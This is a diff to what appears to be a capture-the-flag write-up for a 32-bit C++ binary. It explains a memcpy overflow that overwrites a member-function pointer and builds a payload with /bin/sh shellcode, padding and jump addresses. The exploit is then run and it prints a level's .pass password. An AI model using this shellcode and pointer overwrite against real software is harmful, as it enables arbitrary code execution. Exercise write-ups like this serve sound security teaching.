@@ -44,16 +44,7 @@ int		main(int ac, char **av)
 - Here memcpy() don't check for limits, so it is vulnerable.
 - We want to write 108 bytes in annotation, then overwrite (N::*f)(N &) and then nb
 
-Adresse      Contenu (objets)              Champ
----------    --------------------------    ---------------
-0x0804a000   0x00000005                    a->nb
-0x0804a004   0x080485a0                    a->func (par défaut : operator+)
-0x0804a008   [ annotation (108 octets) ]   a->annotation
-...                      
-0x0804a080   0x00000006                    b->nb
-0x0804a084   0x080485a0                    b->func (par défaut : operator+)
-
-- We will just put a shellcode into the buffer, then we will add the padding until we write 108 bytes, we will then overwrite or member function pointer by the address of annotation to execute the shellcode. BUT it's not a function pointer, it's contained in a Class. Compiler acces the code by doing b->func (Looking for a pointer to member function, it can be operator-() for exemple). So the compiler need a member function address in order to be in accordance with the code.
+- We will just put a shellcode into the buffer, then we will add the padding until we write 108 bytes, we will then overwrite or member function pointer by the address of annotation to execute the shellcode. BUT since calling b->func derefence twice we have to jump at annotation and put an other address where to jump (4 bytes after)
 
 - Address of annotation = 0x0804a00c (Found in parameter of memcpy())
 
@@ -71,4 +62,19 @@ _ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c) = 0xb7fc
 
 ```
 
-- Address of operator-() 
+- (annotation + 4) = 0x0804a010
+
+[addr_fake][shellcode][padding][addr_annotation]
+     ↓         ↓         ↓           ↓
+  4 bytes  ~28 bytes  ~76 bytes   4 bytes
+
+
+```bash
+payload = p32(0x0804a010) + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + padding + p32(0x0804a00c)
+
+python3 exploit.py
+
+$ cat /home/user/bonus1/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
+```
+
